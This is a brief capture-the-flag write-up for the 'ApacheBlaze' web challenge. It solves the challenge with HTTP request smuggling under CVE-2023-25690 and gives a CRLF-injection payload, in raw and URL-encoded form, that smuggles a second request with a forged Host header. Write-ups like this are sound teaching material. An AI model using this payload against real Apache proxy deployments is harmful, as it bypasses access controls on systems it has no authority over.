# ApacheBlaze Write-up

Category: Web

CHALLENGE DESCRIPTION

Step into the ApacheBlaze universe, a world of arcade clicky games. 
Rumor has it that by playing certain games, you have the chance to win a grand prize. However, 
before you can dive into the fun, you'll need to crack a puzzle.

![image](https://github.com/user-attachments/assets/185e2877-af20-40e1-bc0b-fe6d62670404)

This game is currently available only from dev.apacheblaze.local.

Request

![image](https://github.com/user-attachments/assets/876517c1-0908-4fa0-a070-c93d823646d7)

HTTP Request Smuggling

CVE-2023–25690

    GET /api/games/click_topia HTTP/1.1\r\nHost: dev.apacheblaze.local\r\n\r\nGET /HTTP/1.1

URL encode

    GET /api/games/click_topia%20HTTP/1.1%0d%0aHost:%20dev.apacheblaze.local%0d%0a%0d%0aGET%20/ HTTP/1.1

![image](https://github.com/user-attachments/assets/4879cee0-13bd-4a6d-b946-b1200fb5d69e)
